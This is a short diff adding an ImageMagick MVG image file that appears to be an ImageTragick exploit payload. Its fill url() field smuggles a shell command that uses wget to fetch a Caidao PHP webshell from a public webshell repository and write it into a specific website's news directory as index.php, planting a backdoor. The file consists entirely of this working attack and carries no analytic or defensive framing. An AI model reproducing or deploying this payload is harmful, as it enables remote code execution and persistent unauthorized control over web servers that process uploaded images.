@@ -1,0 +1,4 @@
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://"|wget "https://raw.githubusercontent.com/tennc/webshell/master/caidao-shell/p.php" -O /sites/bcbay.com/content/www/news/2015/12/12/big5/index.php")'
+pop graphic-context
